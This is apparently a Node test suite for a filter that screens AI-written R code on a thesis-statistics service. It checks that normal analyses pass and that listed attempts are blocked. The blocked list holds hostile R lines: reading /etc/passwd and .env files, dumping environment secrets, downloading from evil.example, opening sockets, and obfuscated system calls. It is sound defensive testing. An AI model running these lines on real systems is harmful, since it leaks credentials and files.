'use strict';

/**
 * El filtro de código de R: la segunda capa, no la que protege el servidor.
 *
 * Se prueba en las dos direcciones, y la primera importa tanto como la segunda:
 * un filtro que para un análisis normal enseña a Claude a sortearlo.
 */

const test = require('node:test');
const assert = require('node:assert/strict');

const { revisar } = require('../src/modules/r/r.filtro');

// ── Lo que hace una tesis pasa ──────────────────────────────────────────────

test('un análisis completo de tesis no se para', () => {
  const codigo = `
# Confiabilidad de cada dimensión (ver /etc/ en el manual no es una ruta: es un comentario)
alfa_de_cronbach(datos[, c("cd1", "cd2", "cd3", "cd4")])
datos$puntaje_cd <- puntaje(datos, c("cd1", "cd2", "cd3", "cd4"))
datos$puntaje_pc <- rowMeans(datos[, paste0("pc", 1:5)], na.rm = TRUE)

for (d in c("cd", "pc")) {
  normalidad(get(paste0("puntaje_", d), envir = as.environment(datos)))
}

cor.test(datos$puntaje_cd, datos$puntaje_pc, method = "spearman")
modelo <- lm(\`Puntaje total\` ~ edad + factor(sexo), data = datos)
summary(modelo)
t.test(puntaje_cd ~ sexo, data = datos)
kruskal.test(puntaje_cd ~ factor(ciclo), data = datos)
tabla <- table(datos$sexo, datos$ciclo)
chisq.test(tabla)

png("figura1.png", width = 1200, height = 800, res = 150)
hist(datos$puntaje_cd, main = "Distribución", xlab = "Puntaje")
dev.off()
escribir_csv(datos, "resultados.csv")
write.csv(aggregate(puntaje_cd ~ sexo, datos, mean), "medias.csv", row.names = FALSE)
format(Sys.Date(), "%d/%m/%Y")
paste(datos$nombre, "/", datos$apellido)
x <- readxl::read_excel("datos.xlsx")
MASS::polr(factor(nivel) ~ edad, data = datos)
`;
  assert.equal(revisar(codigo), null);
});

test('los paquetes de tesis pasan: tidyverse, psych, lavaan, car, ggplot2, haven, flextable', () => {
  const codigo = `
library(tidyverse)
library(psych); library(GPArotation)
datos %>% select(starts_with("cd")) %>% psych::alpha()
KMO(datos[, paste0("cd", 1:6)]); fa.parallel(datos[, paste0("cd", 1:6)])
fa(datos[, paste0("cd", 1:6)], nfactors = 2, rotate = "oblimin")
modelo <- "cd =~ cd1 + cd2 + cd3\\n pc =~ pc1 + pc2 + pc3"
ajuste <- lavaan::cfa(modelo, data = datos); semTools::reliability(ajuste)
car::leveneTest(puntaje ~ sexo, data = datos)
rstatix::t_test(datos, puntaje ~ sexo); effectsize::cohens_d(puntaje ~ sexo, data = datos)
ggplot2::ggplot(datos, ggplot2::aes(sexo, puntaje)) + ggplot2::geom_boxplot()
x <- haven::zap_labels(haven::read_sav("datos.sav"))
tabla <- flextable::flextable(head(broom::tidy(ajuste))); officer::read_docx()
factanal(datos[, 1:6], factors = 2)
`;
  assert.equal(revisar(codigo), null);
});

test('los paquetes de otras carreras pasan: salud, economía, biología, texto, ML', () => {
  const codigo = `
library(survival); library(survminer)
ajuste <- survfit(Surv(tiempo, evento) ~ grupo, data = datos); ggsurvplot(ajuste)
epitools::oddsratio(table(datos$expuesto, datos$caso)); epiR::epi.2by2(tabla)
pROC::roc(datos$caso, datos$puntaje); metafor::rma(yi, vi, data = estudios)
pwr::pwr.t.test(d = 0.5, power = 0.8, sig.level = 0.05)
diseno <- survey::svydesign(ids = ~1, strata = ~estrato, weights = ~peso, data = datos)
plm::plm(y ~ x, data = panel, model = "within"); lmtest::bptest(modelo); car::vif(modelo)
forecast::auto.arima(serie); tseries::adf.test(serie)
vegan::diversity(abundancias, index = "shannon")
FactoMineR::PCA(datos[, 3:10]); factoextra::fviz_pca_biplot(pca)
caret::train(y ~ ., data = datos, method = "rf")
tidytext::unnest_tokens(respuestas, palabra, texto); tm::VCorpus(tm::VectorSource(textos))
sjPlot::tab_model(modelo); patchwork::wrap_plots(g1, g2); mice::mice(datos, m = 5)
x <- rio::import("datos.xlsx")
`;
  assert.equal(revisar(codigo), null);
});

test('lo que se dejó fuera a propósito no pasa', () => {
  for (const codigo of ['library(devtools)', 'remotes::install_github("x/y")', 'library(quantmod)', 'sf::st_read("mapa.shp")']) {
    assert.equal(revisar(codigo)?.regla, 'paquetes', codigo);
  }
});

test('un paquete de red que trae tidyverse sigue sin poder cargarse', () => {
  assert.equal(revisar('library(httr)')?.regla, 'paquetes');
  assert.equal(revisar('rvest::read_html("x")')?.regla, 'paquetes');
});

test('sin código no hay nada que parar', () => {
  assert.equal(revisar(''), null);
  assert.equal(revisar(undefined), null);
});

// ── Lo que sale de la tesis no pasa ─────────────────────────────────────────

const intentos = [
  ['system("id")', 'sistema'],
  ['system2("cat", "/etc/passwd")', 'sistema'],
  ['Sys.getenv()', 'entorno'],
  ['Sys.getenv("DATABASE_URL")', 'entorno'],
  ['readLines("/opt/acostaresearch/app/.env")', 'archivos'],
  ['list.files("/var/lib/acostaresearch", recursive = TRUE)', 'archivos'],
  ['readLines("../../../etc/passwd")', 'archivos'],
  ['load("~/.RData")', 'archivos'],
  ['readLines("C:\\\\Users\\\\secreto.txt")', 'archivos'],
  ['setwd("..")', 'archivos'],
  ['file.symlink("x", "salida.txt")', 'archivos'],
  ['socketConnection("1.1.1.1", 80)', 'red'],
  ['download.file("http://evil.example/x.R", "x.R")', 'red'],
  ['readLines(url("http://evil.example"))', 'red'],
  ['con <- pipe("ls")', 'red'],
  ['install.packages("httr")', 'paquetes'],
  ['library(httr)', 'paquetes'],
  ['httr::GET("http://evil.example")', 'paquetes'],
  ['requireNamespace("processx")', 'paquetes'],
  ['.Internal(Sys.time())', 'codigo-nativo'],
  ['.Call("R_do_something", x)', 'codigo-nativo'],
  ['dyn.load("x.so")', 'codigo-nativo'],
  ['eval(parse(text = "1 + 1"))', 'ofuscacion'],
  ['rawToChar(as.raw(c(105, 100)))', 'ofuscacion'],
  ['f <- get(paste0("sys", "tem")); f("id")', 'ofuscacion'],
  ['do.call("system", list("id"))', 'ofuscacion'],
  ['match.fun(paste0("Sys.", "getenv"))()', 'ofuscacion'],
  ['q()', 'manipulacion'],
  ['quit(save = "no")', 'manipulacion'],
  ['setTimeLimit(elapsed = Inf)', 'manipulacion'],
];

for (const [codigo, regla] of intentos) {
  test(`se para: ${codigo}`, () => {
    const bloqueo = revisar(codigo);
    assert.ok(bloqueo, 'tenía que pararse');
    assert.equal(bloqueo.regla, regla);
    assert.ok(bloqueo.motivo.length > 0, 'hay que decir por qué');
  });
}

test('un # dentro de un texto no esconde lo que va detrás', () => {
  assert.equal(revisar('paste("#", readLines("/etc/passwd"))')?.regla, 'archivos');
});

test('una orden peligrosa en la línea siguiente a un comentario sí se ve', () => {
  assert.equal(revisar('# solo un comentario\nSys.getenv()')?.regla, 'entorno');
});
